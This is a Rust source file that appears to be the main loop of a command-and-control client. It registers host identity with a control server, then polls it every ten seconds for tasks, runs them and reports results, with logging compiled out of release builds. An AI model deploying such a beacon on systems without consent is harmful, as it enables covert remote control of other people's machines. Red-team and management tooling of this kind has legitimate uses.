extern crate core;

use std::{
    thread,
    time,
};

mod communication;
mod utils;

use crate::models::{
    Task
};


mod tasks;
mod models;

const POLL_SLEEP: time::Duration = time::Duration::from_secs(10);

/// Fetches commands from the control server and runs them, then returns task results to control
/// server
async fn call_home(token: &String) {
    #[cfg(debug_assertions)]
    println!("Asking server for tasks");

    let tasks: Vec<Task> = match communication::get_commands(token).await {
        Ok(val) => val,
        Err(_) => {
            #[cfg(debug_assertions)]
            println!("Error when asking server for tasks.");
            Vec::new()
        },
    };

    if tasks.is_empty() {
        #[cfg(debug_assertions)]
        println!("No task received");
    }

    for t in tasks {
        #[cfg(debug_assertions)]
        println!("\nReceived task #{}: {}", t.id, t.name);
        tasks::run_task(t);
    }
    // Short sleep to ensure short running tasks are completed before checking, quick and dirty
    // solution
    thread::sleep(time::Duration::from_millis(200));

    let complete_tasks = tasks::check_completed();
    for tr in complete_tasks {
        match communication::send_task_result(&tr, token).await {
            Ok(_) => {
                #[cfg(debug_assertions)]
                println!("Successfully sent task #{} result to server", tr.id);
            }
            Err(_) => {
                #[cfg(debug_assertions)]
                println!("Failed send task #{} result to server!", tr.id);
            }
        };
    }
}

/// Initializes the client by sending ID characteristics to the control server.
/// Will poll the server until a authorization token is received
///
/// # Returns
/// The clients authorization token to be used on further requests to the control server.
async fn initialise_client() -> String {
    let mut token: String;
    loop {
        let id = utils::get_host_identify();
        token = match communication::send_identity(id).await {
            Ok(val) => val,
            Err(e) => {
                #[cfg(debug_assertions)]
                println!("Failed to get authorization token from server: {}", e);
                String::from("")
            }
        };

        if token != String::from("") {
            break;
        }
        thread::sleep(POLL_SLEEP);
    }
    #[cfg(debug_assertions)]
    println!("Client initialised");
    return token;
}

#[tokio::main]
async fn main() -> Result<(), anyhow::Error> {
    let token: String = initialise_client().await;
    loop {
        call_home(&token).await;
        thread::sleep(POLL_SLEEP);
    }

    // Ok(())
}
